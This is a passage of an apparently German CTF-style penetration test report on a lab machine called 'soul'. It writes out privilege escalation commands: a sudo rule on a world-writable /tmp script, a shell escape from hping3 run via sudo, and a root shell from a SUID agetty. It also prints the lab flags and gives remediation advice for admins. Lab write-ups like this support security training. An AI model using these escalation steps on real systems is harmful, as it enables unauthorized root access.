+                **Bewertung:** Da `/tmp` ein world-writable Verzeichnis ist, kann `www-data` (oder jeder andere Benutzer) die Datei `/tmp/whoami` erstellen oder überschreiben. Dies ist eine klassische sudo-Fehlkonfiguration, die zur Privilege Escalation missbraucht werden kann.
+            </p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">www-data@soul:/$ <span class="command">echo "bash" > /tmp/whoami</span></div>
+                    <div class="prompt">www-data@soul:/tmp$ <span class="command">chmod 777 whoami</span></div>
+                    <div class="prompt">www-data@soul:/tmp$ <span class="command">sudo -u gabriel /tmp/whoami</span></div>
+                     <div class="prompt">gabriel@soul:/tmp$ <span class="comment"># Shell als gabriel erhalten!</span></div>
+                 </div>
+            </div>
+            <p class="analysis">
+                **Analyse:** `www-data` schreibt den Befehl `bash` in die Datei `/tmp/whoami`, macht sie ausführbar (`chmod 777` ist übertrieben, `+x` würde reichen) und führt sie dann mit `sudo -u gabriel` aus. Dies startet eine Bash-Shell als Benutzer `gabriel`.
+            </p>
+            <p class="evaluation">
+                **Bewertung:** Erfolgreiche Privilege Escalation von `www-data` zu `gabriel`.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):** Als `gabriel` weiter enumerieren (`sudo -l`, Home-Verzeichnis prüfen).<br>
+                **Empfehlung (Admin):** Die gefährliche `sudo`-Regel für `/tmp/whoami` sofort entfernen. Niemals `sudo`-Ausführung von Dateien in world-writable Verzeichnissen erlauben.
+            </p>
+
+
+             <h3 id="privesc-peter">POC: Eskalation zu peter (sudo hping3)</h3>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">gabriel@soul:~$ <span class="command">cat user.txt</span></div>
+                      <pre>
+<span class="password">HMViwazhere</span>
+                     </pre>
+                     <div class="prompt">gabriel@soul:/tmp$ <span class="command">sudo -l</span></div>
+                     <pre>
+Matching Defaults entries for gabriel on soul:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User gabriel may run the following commands on soul:
+    <span class="command">(peter) NPASSWD: /usr/sbin/hping3</span>
+                    </pre>
+                 </div>
+            </div>
+             <p class="analysis">
+                **Analyse:** Als `gabriel` wird die User-Flag `HMViwazhere` gefunden (Pfad `/home/gabriel/user.txt` angenommen). `sudo -l` zeigt, dass `gabriel` den Befehl `/usr/sbin/hping3` als Benutzer `peter` ohne Passwort ausführen darf.
+            </p>
+             <p class="evaluation">
+                **Bewertung:** User-Flag erlangt. Eine weitere unsichere `sudo`-Regel wurde gefunden. `hping3` hat einen interaktiven Modus, der oft zum Ausführen von Shell-Befehlen missbraucht werden kann.
+            </p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">gabriel@soul:/tmp$ <span class="command">sudo -u peter hping3</span></div>
+                      <pre>
+hping3> <span class="command">/bin/bash</span> <span class="comment"># Befehl im hping3 Prompt eingeben</span>
+                     </pre>
+                     <div class="prompt">peter@soul:/tmp$ <span class="comment"># Shell als peter erhalten!</span></div>
+                 </div>
+             </div>
+             <p class="analysis">
+                **Analyse:** `hping3` wird mit `sudo -u peter` gestartet. Am `hping3>`-Prompt wird `/bin/bash` eingegeben. Dies führt dazu, dass `hping3` eine Bash-Shell startet, die als Benutzer `peter` läuft.
+            </p>
+             <p class="evaluation">
+                **Bewertung:** Erfolgreiche Privilege Escalation von `gabriel` zu `peter`.
+            </p>
+             <p class="recommendation">
+                **Empfehlung (Pentester):** Als `peter` weiter enumerieren (`sudo -l`, SUID/Capabilities prüfen).<br>
+                **Empfehlung (Admin):** Die gefährliche `sudo`-Regel für `hping3` entfernen. Interaktive Tools sollten nicht über `sudo` aufrufbar sein, wenn dies nicht absolut notwendig und sicher implementiert ist.
+            </p>
+
+             <h3 id="privesc-root">POC: Eskalation zu root (SUID agetty)</h3>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">peter@soul:/home/gabriel$ <span class="command">find / -perm -u=s -type f 2>/dev/null</span></div>
+                     <pre>
+/usr/bin/su
+/usr/bin/passwd
+/usr/bin/newgrp
+/usr/bin/mount
+/usr/bin/gpasswd
+/usr/bin/umount
+/usr/bin/chfn
+/usr/bin/sudo
+/usr/bin/chsh
+<span class="command">/usr/sbin/agetty</span>
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/openssh/ssh-keysign
+/usr/lib/eject/dmcrypt-get-device
+                     </pre>
+                     <div class="prompt">peter@soul:/home/gabriel$ <span class="command">ls -la /usr/sbin/agetty</span></div>
+                      <pre>
+<span class="command">-rwsrws--- 1 root peter 64744 Jan 10  2019 /usr/sbin/agetty</span>
+                     </pre>
+                 </div>
+             </div>
+             <p class="analysis">
+                **Analyse:** Eine Suche nach SUID-Dateien (`find / -perm -u=s ...`) offenbart mehrere Standard-SUID-Binaries. Die Berechtigungen von `/usr/sbin/agetty` werden geprüft (`ls -la`). Die Ausgabe `-rwsrws---` zeigt, dass `agetty` SUID Root (`s` an der User-Execute-Position) und SGID `peter` (`s` an der Group-Execute-Position) ist und zur Gruppe `peter` gehört.
+            </p>
+             <p class="evaluation">
+                **Bewertung:** Das ist eine kritische Fehlkonfiguration! `agetty` ist normalerweise nicht SUID oder SGID. Die Kombination aus SUID Root und SGID `peter` (der aktuelle Benutzer) macht es trivial, Root-Rechte zu erlangen, indem man `agetty` mit bestimmten Parametern aufruft.
+            </p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">peter@soul:/home/gabriel$ <span class="command">/usr/sbin/agetty -o -p -a root -l /bin/bash tty</span></div>
+                     <pre>
+Debian GNU/Linux 10 soul tty
+
+soul login: <span class="password">root (automatic login)</span>
+
+<span class="prompt">bash-5.0#</span> id
+<span class="command">uid=1002(peter) gid=1002(peter) euid=0(root) groups=1002(peter)</span>
+<span class="prompt">bash-5.0#</span> cd /root
+<span class="prompt">bash-5.0#</span> ls -la
+total 28
+drwx------  4 root root 4096 Nov 26  2020 .
+drwxr-xr-x 18 root root 4096 Nov 26  2020 ..
+-rw-r--r--  1 root root  570 Jan 31  2010 .bashrc
+drwxr-xr-x  3 root root 4096 Nov 26  2020 .local
+-rw-r--r--  1 root root  148 Aug 17  2015 .profile
+drwx------  2 root root 4096 Nov 26  2020 .ssh
+-rw-------  1 root root   11 Nov 26  2020 <span class="command">rootflag.txt</span>
+<span class="prompt">bash-5.0#</span> cat rootflag.txt
+<span class="password">HMVohmygod</span>
+                     </pre>
+                 </div>
+            </div>
+              <p class="analysis">
+                 **Analyse:** Der Befehl `agetty -o -p -a root -l /bin/bash tty` wird ausgeführt.
+                 *   `-o -p`: Optionen für den Login-Prozess (hier wahrscheinlich "no issue" und "no password prompt").
+                 *   `-a root`: Führt einen automatischen Login als Benutzer `root` durch.
+                 *   `-l /bin/bash`: Startet `/bin/bash` als Login-Shell.
+                 *   `tty`: Ein Platzhalter für das Terminalgerät.
+                 Da `agetty` SUID root ist, wird dieser Prozess mit Root-Rechten ausgeführt, was den automatischen Login als `root` und das Starten der Bash-Shell ermöglicht. Der `id`-Befehl zeigt `euid=0(root)`. Anschließend wird die Root-Flag aus `/root/rootflag.txt` gelesen.
+             </p>
+              <p class="evaluation">
+                 **Bewertung:** Privilege Escalation zu Root erfolgreich abgeschlossen durch Ausnutzung des fehlerhaft konfigurierten SUID/SGID `agetty`-Binaries.
+             </p>
+              <p class="recommendation">
+                 **Empfehlung (Pentester):** Root-Flag dokumentieren.<br>
+                 **Empfehlung (Admin):** Die SUID- und SGID-Bits von `/usr/sbin/agetty` sofort entfernen (`chmod ug-s /usr/sbin/agetty`). Untersuchen, warum diese Bits gesetzt wurden (absichtlich oder durch einen Fehler/Exploit?). Regelmäßig SUID/SGID-Binaries auf dem System überprüfen und unnötige oder gefährliche Konfigurationen entfernen.
+             </p>
+
+        </section>
+
+        <!-- Angepasster Flags-Abschnitt -->
+        <section id="flags">
+             <div class="flag-container">
+                 <h2 class="flag-heading">Flags</h2>
+                 <div class="flag-entry">
+                     <div class="flag-command">cat /home/gabriel/user.txt</div> <!-- Pfad aus Shell-Kontext übernommen -->
+                     <div class="flag-value"><span class="password">HMViwazhere</span></div>
+                 </div>
+                 <div class="flag-entry">
+                     <div class="flag-command">cat /root/rootflag.txt</div> <!-- Pfad aus ls übernommen -->
+                     <div class="flag-value"><span class="password">HMVohmygod</span></div>
+                 </div>
+             </div>
+         </section>
+
+  
+
+    <footer class="footer">
+        <p>DarkSpirit - Cyber Security Reports</p>
+        <!-- Datum aus Nmap/Logs extrahiert -->
+        <p>Berichtsdatum: 17. Oktober 2022</p>
+    </footer>
+</body>
+</html>
